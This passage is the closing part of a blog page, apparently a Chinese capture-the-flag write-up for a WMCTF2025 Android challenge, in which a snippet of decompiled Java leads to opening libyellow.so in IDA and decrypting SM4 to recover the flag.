</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NullPointerException(<span style=color:#e6db74>&#34;Missing required view with ID: &#34;</span>.<span style=color:#a6e22e>concat</span>(inflate.<span style=color:#a6e22e>getResources</span>().<span style=color:#a6e22e>getResourceName</span>(i2)));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>从lib中加载了yellow，把<code>libyellow.so</code>拖到IDA里：</p><p><img alt=alt loading=lazy src=/images/WMCTF2025/3.png></p><p>解SM4得到flag：</p><p><img alt=alt loading=lazy src=/images/WMCTF2025/4.png></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>